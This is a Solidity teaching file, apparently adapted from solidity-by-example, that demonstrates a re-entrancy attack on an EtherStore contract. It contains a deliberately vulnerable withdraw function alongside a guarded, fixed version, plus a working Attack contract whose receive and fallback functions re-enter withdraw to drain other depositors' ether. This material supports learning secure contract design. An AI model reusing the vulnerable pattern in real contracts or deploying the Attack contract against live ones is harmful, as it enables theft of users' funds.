// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/console.sol";
/*https://solidity-by-example.org/hacks/re-entrancy/
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
  You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
  plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

contract ReEntrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}

contract EtherStore is
    ReEntrancyGuard //fix2
{
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        uint256 cbal = address(this).balance;
        console.log("ctrt.deposit()...cbal:", cbal / 1e18);
    }

    function withdraw() public {
        uint256 cbal = address(this).balance;
        console.log("ctrt.withdraw()...cbal:", cbal / 1e18);

        uint256 bal = balances[msg.sender];
        console.log("ctrt.withdraw()...user balence:", bal / 1e18);

        require(bal > 0, "user has no balance");
        //balances[msg.sender] -= bal; //fix1
        console.log("ctrt.withdraw()... bal > 0 confirmed");
        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        //payable(msg.sender).transfer(bal);
        console.log("ctrt.withdraw()...sent successful");
        balances[msg.sender] = 0; //fix1b! can be repeated
        console.log("ctrt.withdraw()...end");
    }

    function withdrawFixed() public noReentrant {
        //fix2
        uint256 cbal = address(this).balance;
        console.log("ctrt.withdraw()...cbal:", cbal / 1e18);

        uint256 bal = balances[msg.sender];
        console.log("ctrt.withdraw()...bal:", bal / 1e18);

        require(bal > 0, "user has no balance");
        balances[msg.sender] -= bal; //fix1
        console.log("ctrt.withdraw()...to withdraw ETH");
        //payable(msg.sender).transfer(bal);
        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        console.log("ctrt.withdraw()...sent:");
        //balances[msg.sender] = 0;//fix1b! can be repeated
        console.log("ctrt.withdraw()...end");
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    receive() external payable {
        uint256 etherStoreBalc = address(etherStore).balance;
        console.log("Attack.receive()... ctrt ETH:", etherStoreBalc / 1e18);
        if (etherStoreBalc >= 1 ether) {
            etherStore.withdraw();
        }
    }

    fallback() external payable {
        console.log("Attack.fallback()");
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "attacker has not enough Ethers or no ethers in value");
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
